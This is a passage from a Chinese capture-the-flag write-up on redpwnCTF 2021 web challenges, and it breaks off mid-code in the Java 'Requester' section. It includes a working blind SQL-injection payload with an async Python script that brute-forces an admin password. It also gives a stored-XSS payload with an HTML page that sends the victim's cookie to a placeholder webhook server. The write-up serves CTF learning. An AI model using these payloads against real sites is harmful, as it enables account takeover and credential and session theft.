<div class=highlight><pre tabindex=0 style=color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=color:#111>excute</span><span style=color:#111>(</span><span style=color:#d88200>&#39;INSERT INTO users(username, password)&#39;</span> <span style=color:#111>values</span> <span style=color:#111>(</span><span style=color:#d88200>&#39;xxxxusernamexxxx&#39;</span><span style=color:#111>,</span> <span style=color:#d88200>&#39;&#39;</span><span style=color:#f92672>||</span><span style=color:#111>(</span><span style=color:#111>select</span> <span style=color:#111>substr</span><span style=color:#111>(</span><span style=color:#111>password</span><span style=color:#111>,</span><span style=color:#111>n</span><span style=color:#111>,</span><span style=color:#ae81ff>1</span><span style=color:#111>)</span> <span style=color:#f92672>from</span> <span style=color:#111>users</span><span style=color:#111>)</span><span style=color:#f92672>||</span><span style=color:#d88200>&#39;&#39;</span><span style=color:#111>))</span>
</code></pre></div><p>其中<code>||</code>连接两个不同的字符串，得到一个新的字符串；所以发送注册请求时password的值就是后面的查询语句<code>select substr(password,n,1) from users</code>，而查询语句返回的是<code>substr(password,n,1)</code> 是ginkoid这个账户的密码的其中一位，要获得这个值具体是什么 需要再有一个<code>for in _ in charset</code>遍历，在登录处 把这个值给试出来</p>
<p><a href=https://github.com/Muirey03/redpwn2021_writeups/blob/master/web_cool.md>英文版讲解</a>：<em>The SELECT statement will take the character at index in ginkoid&rsquo;s password, and concatenate it with &lsquo;&rsquo;, to be used as the new user&rsquo;s password. We can then try logging in as our new user with every character in allowed_characters as the password. If we login successfully, then we know that we guessed the character correctly. Repeating this for all 32 characters gives us our password.</em></p>
<p>获得密码后以ginkoid的账号登录，会得到一个mp3文件，但是并不是什么所谓的隐写 flag就在抓包后可以看到</p>
<p><img src=https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210713164749339.png alt=image-20210713164749339></p>
<p>————其实还是有一点点疑问，为什么<code>select substr(password,n,1) from users</code>就能确保是ginoid的passwd呢？ginkoid是表中的第一条数据，在新建表后立刻插入，这就可以保证在查询的时候只查ginkoid的密码吗？</p>
<p>discord之前有人问过这个问题，当时的解答是这是sqllite的特性，但是用sqllite在线工具尝试后发现也不是这样的 也会返回所有数据的<code>substr(x,x,x)</code>的值，但是确实是用这样的payload能做出来</p>
<p><img src=https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210713164423092.png alt=image-20210713164423092></p>
<p>————后来想了一下 是这里的<code>return correct_password[0][0]==password</code> 确保了虽然sql查询语句返回的是很多个单一字母，但是是多行返回，仍然只会取到第一个；再加上username是主键 第一个插入，所以这个payload是可以的<img src=https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210716173434141.png alt=image-20210716173434141></p>
<p>以一个事后诸葛亮的角度来看<code>return correct_password[0][0]==password</code> 这句代码 其实有暗示的成分在了</p>
<p>————还有另一版的脚本 discord里收的<img src=https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210716175415526.png alt=image-20210716175415526.png></p>
<div class=highlight><pre tabindex=0 style=color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=color:#f92672>import</span> <span style=color:#111>asyncio</span>
<span style=color:#f92672>import</span> <span style=color:#111>random</span>

<span style=color:#f92672>import</span> <span style=color:#111>aiohttp</span>

<span style=color:#111>allowed</span> <span style=color:#f92672>=</span> <span style=color:#d88200>&#39;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ123456789&#39;</span>
<span style=color:#111>url</span> <span style=color:#f92672>=</span> <span style=color:#d88200>&#39;&lt;https://cool.mc.ax/&gt;&#39;</span>

<span style=color:#111>n</span> <span style=color:#f92672>=</span> <span style=color:#ae81ff>32</span>
<span style=color:#111>final</span> <span style=color:#f92672>=</span> <span style=color:#111>dict</span><span style=color:#111>()</span>

<span style=color:#00a8c8>async</span> <span style=color:#00a8c8>def</span> <span style=color:#75af00>try_pass</span><span style=color:#111>(</span><span style=color:#111>sem</span><span style=color:#111>,</span> <span style=color:#111>username</span><span style=color:#111>,</span> <span style=color:#111>password</span><span style=color:#111>,</span> <span style=color:#111>index</span><span style=color:#111>):</span>
    <span style=color:#111>params</span> <span style=color:#f92672>=</span> <span style=color:#111>{</span>
        <span style=color:#d88200>&#39;username&#39;</span><span style=color:#111>:</span> <span style=color:#111>username</span><span style=color:#111>,</span>
        <span style=color:#d88200>&#39;password&#39;</span><span style=color:#111>:</span> <span style=color:#111>password</span><span style=color:#111>,</span>
    <span style=color:#111>}</span>
    <span style=color:#00a8c8>async</span> <span style=color:#00a8c8>with</span> <span style=color:#111>sem</span><span style=color:#111>:</span>
        <span style=color:#00a8c8>async</span> <span style=color:#00a8c8>with</span> <span style=color:#111>aiohttp</span><span style=color:#f92672>.</span><span style=color:#111>ClientSession</span><span style=color:#111>()</span> <span style=color:#00a8c8>as</span> <span style=color:#111>session</span><span style=color:#111>:</span>
            <span style=color:#00a8c8>async</span> <span style=color:#00a8c8>with</span> <span style=color:#111>session</span><span style=color:#f92672>.</span><span style=color:#111>post</span><span style=color:#111>(</span><span style=color:#111>url</span><span style=color:#111>,</span> <span style=color:#111>data</span><span style=color:#f92672>=</span><span style=color:#111>params</span><span style=color:#111>)</span> <span style=color:#00a8c8>as</span> <span style=color:#111>resp</span><span style=color:#111>:</span>
                <span style=color:#111>result</span> <span style=color:#f92672>=</span> <span style=color:#00a8c8>await</span> <span style=color:#111>resp</span><span style=color:#f92672>.</span><span style=color:#111>text</span><span style=color:#111>()</span>
                <span style=color:#00a8c8>if</span> <span style=color:#d88200>&#39;Incorrect&#39;</span> <span style=color:#f92672>not</span> <span style=color:#f92672>in</span> <span style=color:#111>result</span><span style=color:#111>:</span>
                    <span style=color:#111>print</span><span style=color:#111>(</span><span style=color:#d88200>f</span><span style=color:#d88200>&#39;password[</span><span style=color:#d88200>{</span><span style=color:#111>index</span><span style=color:#d88200>}</span><span style=color:#d88200>]: </span><span style=color:#d88200>{</span><span style=color:#111>password</span><span style=color:#d88200>}</span><span style=color:#d88200>&#39;</span><span style=color:#111>)</span>
                    <span style=color:#111>final</span><span style=color:#111>[</span><span style=color:#111>index</span><span style=color:#111>]</span> <span style=color:#f92672>=</span> <span style=color:#111>password</span>

<span style=color:#00a8c8>async</span> <span style=color:#00a8c8>def</span> <span style=color:#75af00>get_char</span><span style=color:#111>(</span><span style=color:#111>sem</span><span style=color:#111>,</span> <span style=color:#111>index</span><span style=color:#111>):</span>
    <span style=color:#75715e># random username since otherwise we error</span>
    <span style=color:#111>username</span> <span style=color:#f92672>=</span> <span style=color:#d88200>&#39;&#39;</span><span style=color:#f92672>.</span><span style=color:#111>join</span><span style=color:#111>(</span><span style=color:#111>random</span><span style=color:#f92672>.</span><span style=color:#111>choices</span><span style=color:#111>(</span><span style=color:#111>allowed</span><span style=color:#111>,</span> <span style=color:#111>k</span><span style=color:#f92672>=</span><span style=color:#ae81ff>32</span><span style=color:#111>))</span>
    <span style=color:#111>payload</span> <span style=color:#f92672>=</span> <span style=color:#d88200>f</span><span style=color:#d88200>&#34;&#39;||(SELECT substr(password,</span><span style=color:#d88200>{</span><span style=color:#111>index</span><span style=color:#f92672>+</span><span style=color:#ae81ff>1</span><span style=color:#d88200>}</span><span style=color:#d88200>,1) FROM users)||&#39;&#34;</span>
    <span style=color:#00a8c8>assert</span><span style=color:#111>(</span><span style=color:#111>len</span><span style=color:#111>(</span><span style=color:#111>payload</span><span style=color:#111>)</span> <span style=color:#f92672>&lt;=</span> <span style=color:#ae81ff>50</span><span style=color:#111>)</span>

    <span style=color:#111>params</span> <span style=color:#f92672>=</span> <span style=color:#111>{</span>
        <span style=color:#d88200>&#39;username&#39;</span><span style=color:#111>:</span> <span style=color:#111>username</span><span style=color:#111>,</span>
        <span style=color:#d88200>&#39;password&#39;</span><span style=color:#111>:</span> <span style=color:#111>payload</span><span style=color:#111>,</span>
    <span style=color:#111>}</span>

    <span style=color:#00a8c8>async</span> <span style=color:#00a8c8>with</span> <span style=color:#111>sem</span><span style=color:#111>:</span>
        <span style=color:#00a8c8>async</span> <span style=color:#00a8c8>with</span> <span style=color:#111>aiohttp</span><span style=color:#f92672>.</span><span style=color:#111>ClientSession</span><span style=color:#111>()</span> <span style=color:#00a8c8>as</span> <span style=color:#111>session</span><span style=color:#111>:</span>
            <span style=color:#00a8c8>await</span> <span style=color:#111>session</span><span style=color:#f92672>.</span><span style=color:#111>post</span><span style=color:#111>(</span><span style=color:#111>url</span> <span style=color:#f92672>+</span> <span style=color:#d88200>&#39;register&#39;</span><span style=color:#111>,</span> <span style=color:#111>data</span><span style=color:#f92672>=</span><span style=color:#111>params</span><span style=color:#111>)</span>

    <span style=color:#111>tasks</span> <span style=color:#f92672>=</span> <span style=color:#111>[]</span>
    <span style=color:#00a8c8>for</span> <span style=color:#111>c</span> <span style=color:#f92672>in</span> <span style=color:#111>allowed</span><span style=color:#111>:</span>
        <span style=color:#111>tasks</span><span style=color:#f92672>.</span><span style=color:#111>append</span><span style=color:#111>(</span><span style=color:#111>try_pass</span><span style=color:#111>(</span><span style=color:#111>sem</span><span style=color:#111>,</span> <span style=color:#111>username</span><span style=color:#111>,</span> <span style=color:#111>c</span><span style=color:#111>,</span> <span style=color:#111>index</span><span style=color:#111>))</span>

    <span style=color:#00a8c8>await</span> <span style=color:#111>asyncio</span><span style=color:#f92672>.</span><span style=color:#111>gather</span><span style=color:#111>(</span><span style=color:#f92672>*</span><span style=color:#111>tasks</span><span style=color:#111>)</span>

<span style=color:#00a8c8>async</span> <span style=color:#00a8c8>def</span> <span style=color:#75af00>main</span><span style=color:#111>():</span>
    <span style=color:#75715e># without this we get an OSError due to too many open file descriptors</span>
    <span style=color:#111>sem</span> <span style=color:#f92672>=</span> <span style=color:#111>asyncio</span><span style=color:#f92672>.</span><span style=color:#111>Semaphore</span><span style=color:#111>(</span><span style=color:#ae81ff>300</span><span style=color:#111>)</span>

    <span style=color:#111>index_tasks</span> <span style=color:#f92672>=</span> <span style=color:#111>[]</span>
    <span style=color:#00a8c8>for</span> <span style=color:#111>i</span> <span style=color:#f92672>in</span> <span style=color:#111>range</span><span style=color:#111>(</span><span style=color:#111>n</span><span style=color:#111>):</span>
        <span style=color:#111>index_tasks</span><span style=color:#f92672>.</span><span style=color:#111>append</span><span style=color:#111>(</span><span style=color:#111>get_char</span><span style=color:#111>(</span><span style=color:#111>sem</span><span style=color:#111>,</span> <span style=color:#111>i</span><span style=color:#111>))</span>

    <span style=color:#00a8c8>await</span> <span style=color:#111>asyncio</span><span style=color:#f92672>.</span><span style=color:#111>gather</span><span style=color:#111>(</span><span style=color:#f92672>*</span><span style=color:#111>index_tasks</span><span style=color:#111>)</span>

    <span style=color:#111>password</span> <span style=color:#f92672>=</span> <span style=color:#d88200>&#39;&#39;</span>
    <span style=color:#00a8c8>for</span> <span style=color:#111>i</span> <span style=color:#f92672>in</span> <span style=color:#111>range</span><span style=color:#111>(</span><span style=color:#111>len</span><span style=color:#111>(</span><span style=color:#111>final</span><span style=color:#111>)):</span>
        <span style=color:#111>password</span> <span style=color:#f92672>+=</span> <span style=color:#111>final</span><span style=color:#111>[</span><span style=color:#111>i</span><span style=color:#111>]</span>

    <span style=color:#111>print</span><span style=color:#111>(</span><span style=color:#d88200>f</span><span style=color:#d88200>&#34;Password: </span><span style=color:#d88200>{</span><span style=color:#111>password</span><span style=color:#d88200>}</span><span style=color:#d88200>&#34;</span><span style=color:#111>)</span>

<span style=color:#111>asyncio</span><span style=color:#f92672>.</span><span style=color:#111>run</span><span style=color:#111>(</span><span style=color:#111>main</span><span style=color:#111>())</span>
</code></pre></div><h2 id=webnotes>web/notes</h2>
<blockquote>
<p>Texting things to yourself, but online! <a href=https://notes.mc.ax/>notes.mc.ax</a></p>
<p><em>Please put a reasonably secure password when making an account</em></p>
<p>Report problems <a href=https://admin-bot.mc.ax/notes>here</a>.</p>
<p>Downloads - <a href=https://static.redpwn.net/uploads/b84015269379e24fc336a02b23656a1428e8bea965667738ede86e3c8e611ca1/notes.tar.gz>notes.tar.gz</a></p>
</blockquote>
<p>先看页面 是个登录框，先填用户名和密码再点login或register，尝试test: test登入，界面是一个可以加notes 自定body和tag的app<img src=https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210710144224462.png alt=image-20210710144224462></p>
<p>在view notes看到已经有人试过xss了，这里有个小小的越权漏洞，/view/+username直接可以看到其他的师傅在尝试什么样的payload（看了wp以后才意识到这里的tag部分就是注入点 而当时的我以为是卡bug了<img src=https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210710195356571.png alt=image-20210710195356571></p>
<p>简单审了下源码，也没啥特别的，首先初始化一个admin号，flag在admin的private分类的notes中；对于个人发的notes会转义body部分为html实体来预防xss</p>
<p>但是这个notes-app的形式是妥妥的xss了，那突破口在哪里捏？其实是被忽略的tag部分！一般情况下看到tag可选private/public就会不关注这里，但是配合特殊的DOM解析 这里无疑是注入点！下面简单分析一下，<a href=https://cor.team/posts/redpwnCTF%202021%20-%20web%20challenges#notes>参考wp</a></p>
<p>从/static/view.html中我们可以看到这个notes-app的前端渲染所凭借的模板长啥样</p>
<p><img src=https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210806093357548.png alt=image-20210806093357548></p>
<p>body部分被完全的保护了，但是tag没有过滤 只是限制了个数</p>
<p><img src=https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210806093711969.png alt=image-20210806093711969></p>
<p>我们利用的就是浏览器解析html的部分，可以让不相关的几个notes拼接在一起（举个简单的栗子：在一个note里面用<code>&lt;p></code> 另一个里面放<code>&lt;/p></code>，中间的部分会被放在一起）这里选用的是<code>&lt;style></code>这个tag，利用它onload的属性</p>
<p>还有一个待解决的问题是上下两个notes之间会有<code>&lt;div class="card"></code>的存在；这也是不用<code>&lt;iframe></code>和它的onload属性的原因，因为浏览器是不允许<code>&lt;iframe></code>中属性换行的</p>
<p>我们最终的payload</p>
<pre tabindex=0><code>body: anything
tag: &lt;style a='
body: anything
tag: 'onload='`
body: `;eval(somecode)/*
tag: */'&gt;
</code></pre><p>然后是常规的xss</p>
<div class=highlight><pre tabindex=0 style=color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-html data-lang=html><span style=color:#75715e>&lt;!DOCTYPE html&gt;</span>
<span style=color:#111>&lt;</span><span style=color:#f92672>html</span><span style=color:#111>&gt;</span>
    <span style=color:#111>&lt;</span><span style=color:#f92672>body</span><span style=color:#111>&gt;</span>
        <span style=color:#111>&lt;</span><span style=color:#f92672>script</span><span style=color:#111>&gt;</span>
            <span style=color:#111>window</span><span style=color:#111>.</span><span style=color:#75af00>open</span><span style=color:#111>(</span><span style=color:#d88200>&#34;https://notes.mc.ax/view/&lt;username&gt;&#34;</span><span style=color:#111>,</span> <span style=color:#d88200>&#34;navigator.sendBeacon(&#39;&lt;webhook server&gt;&#39;, document.cookie)&#34;</span><span style=color:#111>);</span>
        <span style=color:#111>&lt;/</span><span style=color:#f92672>script</span><span style=color:#111>&gt;</span>
    <span style=color:#111>&lt;/</span><span style=color:#f92672>body</span><span style=color:#111>&gt;</span>
<span style=color:#111>&lt;/</span><span style=color:#f92672>html</span><span style=color:#111>&gt;</span>
</code></pre></div><h2 id=webrequester>web/Requester</h2>
<blockquote>
<p>Java is the future. Strictly typed, extremeley secure, and the most modern frameworks all come together to make an unhackable service. - Nobody 2021</p>
<p><a href=https://requester.mc.ax/>requester.mc.ax</a></p>
<p>Downloads - <a href=https://static.redpwn.net/uploads/d92499fb296055bd3767e8d5c707605ca56a00517726fa281fa35dfda611fdee/requester-release.zip>requester-release.zip</a></p>
</blockquote>
<p>java可以说是完全不懂，比赛的时候就简单看了下就溜了，参考 <a href=https://fireshellsecurity.team/redpwnctf-requester-and-requester-strikes-back/>解法1 - _replicator</a> <a href=https://cor.team/posts/redpwnCTF%202021%20-%20web%20challenges#requester>解法2 - _find</a></p>
<p><img src=https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210806100214553.png alt=image-20210806100214553></p>
<p>一个简单的java-app，检测给出的api是否正常 并且返回一个json</p>
<p>给了docker</p>
<p><img src=https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210710160029981.png alt=image-20210710160029981></p>
<p>先用jd-gui打开jar包看看源码</p>
<p><img src=https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210716211333162.png alt=image-20210716211333162></p>
<p>先看Main.class</p>
<div class=highlight><pre tabindex=0 style=color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-java data-lang=java><span style=color:#00a8c8>public</span> <span style=color:#00a8c8>class</span> <span style=color:#75af00>Main</span> <span style=color:#f92672>{</span>
    <span style=color:#00a8c8>public</span> <span style=color:#00a8c8>static</span> <span style=color:#111>Database</span> <span style=color:#111>db</span><span style=color:#f92672>;</span>

    <span style=color:#00a8c8>public</span> <span style=color:#00a8c8>static</span> <span style=color:#111>String</span> <span style=color:#111>flag</span><span style=color:#f92672>;</span>

    <span style=color:#00a8c8>public</span> <span style=color:#00a8c8>static</span> <span style=color:#00a8c8>void</span> <span style=color:#75af00>main</span><span style=color:#f92672>(</span><span style=color:#111>String</span><span style=color:#f92672>[]</span> <span style=color:#111>args</span><span style=color:#f92672>)</span> <span style=color:#f92672>{</span>
        <span style=color:#111>String</span> <span style=color:#111>adminUser</span> <span style=color:#f92672>=</span> <span style=color:#111>System</span><span style=color:#f92672>.</span><span style=color:#75af00>getenv</span><span style=color:#f92672>(</span><span style=color:#d88200>&#34;adminUser&#34;</span><span style=color:#f92672>);</span>
        <span style=color:#111>String</span> <span style=color:#111>adminPassword</span> <span style=color:#f92672>=</span> <span style=color:#111>System</span><span style=color:#f92672>.</span><span style=color:#75af00>getenv</span><span style=color:#f92672>(</span><span style=color:#d88200>&#34;adminPassword&#34;</span><span style=color:#f92672>);</span>
        <span style=color:#111>flag</span> <span style=color:#f92672>=</span> <span style=color:#111>System</span><span style=color:#f92672>.</span><span style=color:#75af00>getenv</span><span style=color:#f92672>(</span><span style=color:#d88200>&#34;flag&#34;</span><span style=color:#f92672>);</span>
        <span style=color:#111>String</span> <span style=color:#111>javalinEnv</span> <span style=color:#f92672>=</span> <span style=color:#111>System</span><span style=color:#f92672>.</span><span style=color:#75af00>getenv</span><span style=color:#f92672>(</span><span style=color:#d88200>&#34;javalinEnv&#34;</span><span style=color:#f92672>);</span>
        <span style=color:#111>db</span> <span style=color:#f92672>=</span> <span style=color:#00a8c8>new</span> <span style=color:#111>Database</span><span style=color:#f92672>(</span><span style=color:#111>adminUser</span><span style=color:#f92672>,</span> <span style=color:#111>adminPassword</span><span style=color:#f92672>);</span>
        <span style=color:#111>db</span><span style=color:#f92672>.</span><span style=color:#75af00>initializeDatabase</span><span style=color:#f92672>();</span>
        <span style=color:#111>JavalinJte</span><span style=color:#f92672>.</span><span style=color:#75af00>configure</span><span style=color:#f92672>(</span><span style=color:#111>createTemplateEngine</span><span style=color:#f92672>(</span><span style=color:#111>javalinEnv</span><span style=color:#f92672>));</span>
        <span style=color:#111>Javalin</span> <span style=color:#111>app</span> <span style=color:#f92672>=</span> <span style=color:#111>Javalin</span><span style=color:#f92672>.</span><span style=color:#75af00>create</span><span style=color:#f92672>().</span><span style=color:#75af00>start</span><span style=color:#f92672>(</span><span style=color:#111>8080</span><span style=color:#f92672>);</span>
        <span style=color:#111>app</span><span style=color:#f92672>.</span><span style=color:#75af00>get</span><span style=color:#f92672>(</span><span style=color:#d88200>&#34;/&#34;</span><span style=color:#f92672>,</span> <span style=color:#111>ctx</span> <span style=color:#f92672>-&gt;</span> <span style=color:#111>ctx</span><span style=color:#f92672>.</span><span style=color:#75af00>render</span><span style=color:#f92672>(</span><span style=color:#d88200>&#34;index.jte&#34;</span><span style=color:#f92672>));</span>
        <span style=color:#111>app</span><span style=color:#f92672>.</span><span style=color:#75af00>get</span><span style=color:#f92672>(</span><span style=color:#d88200>&#34;/createUser&#34;</span><span style=color:#f92672>,</span> <span style=color:#111>Handlers</span><span style=color:#f92672>::</span><span style=color:#111>createUser</span><span style=color:#f92672>);</span>
        <span style=color:#111>app</span><span style=color:#f92672>.</span><span style=color:#75af00>get</span><span style=color:#f92672>(</span><span style=color:#d88200>&#34;/testAPI&#34;</span><span style=color:#f92672>,</span> <span style=color:#111>Handlers</span><span style=color:#f92672>::</span><span style=color:#111>testAPI</span><span style=color:#f92672>);</span>
    <span style=color:#f92672>}</span>
<span style=color:#f92672>}</span>
</code></pre></div><p>做一些初始化的工作，取出admin的用户名和密码以及flag的值，新建一个database，分出3个路由；</p>
<p>先看database.class（分析的比较详细 之前做java很少</p>
<div class=highlight><pre tabindex=0 style=color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-java data-lang=java><span style=color:#00a8c8>private</span> <span style=color:#00a8c8>final</span> <span style=color:#111>String</span> <span style=color:#111>adminUsername</span><span style=color:#f92672>;</span>
<span style=color:#00a8c8>private</span> <span style=color:#00a8c8>final</span> <span style=color:#111>String</span> <span style=color:#111>adminPassword</span><span style=color:#f92672>;</span>

<span style=color:#00a8c8>public</span> <span style=color:#75af00>Database</span><span style=color:#f92672>(</span><span style=color:#111>String</span> <span style=color:#111>adminUsername</span><span style=color:#f92672>,</span> <span style=color:#111>String</span> <span style=color:#111>adminPassword</span><span style=color:#f92672>)</span> <span style=color:#f92672>{</span>
    <span style=color:#00a8c8>this</span><span style=color:#f92672>.</span><span style=color:#75af00>adminUsername</span> <span style=color:#f92672>=</span> <span style=color:#111>adminUsername</span><span style=color:#f92672>;</span>
    <span style=color:#00a8c8>this</span><span style=color:#f92672>.</span><span style=color:#75af00>adminPassword</span> <span style=color:#f92672>=</span> <span style=color:#111>adminPassword</span><span style=color:#f92672>;</span>
<span style=color:#f92672>}</span>

<span style=color:#00a8c8>private</span> <span style=color:#111>String</span> <span style=color:#75af00>getDbString</span><span style=color:#f92672>()</span> <span style=color:#f92672>{</span>
    <span style=color:#00a8c8>return</span> <span style=color:#d88200>&#34;http://&#34;</span> <span style=color:#f92672>+</span> <span style=color:#00a8c8>this</span><span style=color:#f92672>.</span><span style=color:#75af00>adminUsername</span> <span style=color:#f92672>+</span> <span style=color:#d88200>&#34;:&#34;</span> <span style=color:#f92672>+</span> <span style=color:#00a8c8>this</span><span style=color:#f92672>.</span><span style=color:#75af00>adminPassword</span> <span style=color:#f92672>+</span> <span style=color:#d88200>&#34;@couchdb:5984/&#34;</span><span style=color:#f92672>;</span>
<span style=color:#f92672>}</span>

<span style=color:#00a8c8>private</span> <span style=color:#00a8c8>boolean</span> <span style=color:#75af00>validateAlphanumeric</span><span style=color:#f92672>(</span><span style=color:#111>String</span> <span style=color:#111>name</span><span style=color:#f92672>)</span> <span style=color:#f92672>{</span>
    <span style=color:#00a8c8>return</span> <span style=color:#111>name</span><span style=color:#f92672>.</span><span style=color:#75af00>matches</span><span style=color:#f92672>(</span><span style=color:#d88200>&#34;^[a-zA-Z0-9_]*$&#34;</span><span style=color:#f92672>);</span>
<span style=color:#f92672>}</span>
</code></pre></div><p>存储从main.class里接收到的adminUsername&adminPassword；<code>getDbString()</code>返回一个可以用来连接couchdb数据库的url</p>
<div class=highlight><pre tabindex=0 style=color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-java data-lang=java><span style=color:#00a8c8>public</span> <span style=color:#00a8c8>void</span> <span style=color:#75af00>createDatabase</span><span style=color:#f92672>(</span><span style=color:#111>String</span> <span style=color:#111>name</span><span style=color:#f92672>)</span> <span style=color:#00a8c8>throws</span> <span style=color:#111>Exception</span> <span style=color:#f92672>{</span>
    <span style=color:#00a8c8>if</span> <span style=color:#f92672>(</span><span style=color:#111>name</span><span style=color:#f92672>.</span><span style=color:#75af00>length</span><span style=color:#f92672>()</span> <span style=color:#f92672>&gt;</span> <span style=color:#111>16</span> <span style=color:#f92672>||</span> <span style=color:#f92672>!</span><span style=color:#111>validateAlphanumeric</span><span style=color:#f92672>(</span><span style=color:#111>name</span><span style=color:#f92672>))</span>
      <span style=color:#00a8c8>throw</span> <span style=color:#00a8c8>new</span> <span style=color:#111>Exception</span><span style=color:#f92672>(</span><span style=color:#d88200>&#34;Illegal name&#34;</span><span style=color:#f92672>);</span>
    <span style=color:#111>JSONObject</span> <span style=color:#111>res</span> <span style=color:#f92672>=</span> <span style=color:#111>HttpClient</span><span style=color:#f92672>.</span><span style=color:#75af00>putAPI</span><span style=color:#f92672>(</span><span style=color:#111>getDbString</span><span style=color:#f92672>()</span> <span style=color:#f92672>+</span> <span style=color:#111>getDbString</span><span style=color:#f92672>(),</span> <span style=color:#d88200>&#34;&#34;</span><span style=color:#f92672>);</span>
    <span style=color:#00a8c8>if</span> <span style=color:#f92672>(!</span><span style=color:#111>res</span><span style=color:#f92672>.</span><span style=color:#75af00>has</span><span style=color:#f92672>(</span><span style=color:#d88200>&#34;ok&#34;</span><span style=color:#f92672>)</span> <span style=color:#f92672>||</span> <span style=color:#f92672>!</span><span style=color:#111>res</span><span style=color:#f92672>.</span><span style=color:#75af00>getBoolean</span><span style=color:#f92672>(</span><span style=color:#d88200>&#34;ok&#34;</span><span style=color:#f92672>))</span>
      <span style=color:#00a8c8>throw</span> <span style=color:#00a8c8>new</span> <span style=color:#111>Exception</span><span style=color:#f92672>(</span><span style=color:#d88200>&#34;Database creation failed&#34;</span><span style=color:#f92672>);</span>
  <span style=color:#f92672>}</span>

  <span style=color:#00a8c8>public</span> <span style=color:#00a8c8>void</span> <span style=color:#75af00>initializeDatabase</span><span style=color:#f92672>()</span> <span style=color:#f92672>{</span>
    <span style=color:#00a8c8>try</span> <span style=color:#f92672>{</span>
      <span style=color:#111>createDatabase</span><span style=color:#f92672>(</span><span style=color:#d88200>&#34;_replicator&#34;</span><span style=color:#f92672>);</span>
    <span style=color:#f92672>}</span> <span style=color:#00a8c8>catch</span> <span style=color:#f92672>(</span><span style=color:#111>Exception</span> <span style=color:#111>e</span><span style=color:#f92672>)</span> <span style=color:#f92672>{</span>
      <span style=color:#111>Utils</span><span style=color:#f92672>.</span><span style=color:#75af00>logException</span><span style=color:#f92672>(</span><span style=color:#111>e</span><span style=color:#f92672>);</span>
      <span style=color:#111>System</span><span style=color:#f92672>.</span><span style=color:#75af00>out</span><span style=color:#f92672>.</span><span style=color:#75af00>println</span><span style=color:#f92672>(</span><span style=color:#d88200>&#34;Replicator already initialized&#34;</span><span style=color:#f92672>);</span>
    <span style=color:#f92672>}</span>
    <span style=color:#00a8c8>try</span> <span style=color:#f92672>{</span>
      <span style=color:#111>createDatabase</span><span style=color:#f92672>(</span><span style=color:#d88200>&#34;_users&#34;</span><span style=color:#f92672>);</span>
    <span style=color:#f92672>}</span> <span style=color:#00a8c8>catch</span> <span style=color:#f92672>(</span><span style=color:#111>Exception</span> <span style=color:#111>e</span><span style=color:#f92672>)</span> <span style=color:#f92672>{</span>
      <span style=color:#111>Utils</span><span style=color:#f92672>.</span><span style=color:#75af00>logException</span><span style=color:#f92672>(</span><span style=color:#111>e</span><span style=color:#f92672>);</span>
      <span style=color:#111>System</span><span style=color:#f92672>.</span><span style=color:#75af00>out</span><span style=color:#f92672>.</span><span style=color:#75af00>println</span><span style=color:#f92672>(</span><span style=color:#d88200>&#34;Users already initialized&#34;</span><span style=color:#f92672>);</span>
    <span style=color:#f92672>}</span>
    <span style=color:#00a8c8>try</span> <span style=color:#f92672>{</span>
      <span style=color:#111>createDatabase</span><span style=color:#f92672>(</span><span style=color:#d88200>&#34;log&#34;</span><span style=color:#f92672>);</span>
    <span style=color:#f92672>}</span> <span style=color:#00a8c8>catch</span> <span style=color:#f92672>(</span><span style=color:#111>Exception</span> <span style=color:#111>e</span><span style=color:#f92672>)</span> <span style=color:#f92672>{</span>
      <span style=color:#111>Utils</span><span style=color:#f92672>.</span><span style=color:#75af00>logException</span><span style=color:#f92672>(</span><span style=color:#111>e</span><span style=color:#f92672>);</span>
      <span style=color:#111>System</span><span style=color:#f92672>.</span><span style=color:#75af00>out</span><span style=color:#f92672>.</span><span style=color:#75af00>println</span><span style=color:#f92672>(</span><span style=color:#d88200>&#34;Log already initialized&#34;</span><span style=color:#f92672>);</span>
    <span style=color:#f92672>}</span>
<span style=color:#f92672>}</span>
</code></pre></div><p>通过向构造好的url发送http请求来创建数据库，有三个默认的库：_replicator, _users, log</p>
<div class=highlight><pre tabindex=0 style=color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-java data-lang=java><span style=color:#00a8c8>public</span> <span style=color:#00a8c8>void</span> <span style=color:#75af00>createUser</span><span style=color:#f92672>(</span><span style=color:#111>String</span> <span style=color:#111>name</span><span style=color:#f92672>,</span> <span style=color:#111>String</span> <span style=color:#111>password</span><span style=color:#f92672>)</span> <span style=color:#00a8c8>throws</span> <span style=color:#111>Exception</span> <span style=color:#f92672>{</span>
    <span style=color:#00a8c8>if</span> <span style=color:#f92672>(</span><span style=color:#111>name</span><span style=color:#f92672>.</span><span style=color:#75af00>length</span><span style=color:#f92672>()</span> <span style=color:#f92672>&gt;</span> <span style=color:#111>16</span> <span style=color:#f92672>||</span> <span style=color:#f92672>!</span><span style=color:#111>validateAlphanumeric</span><span style=color:#f92672>(</span><span style=color:#111>name</span><span style=color:#f92672>))</span>
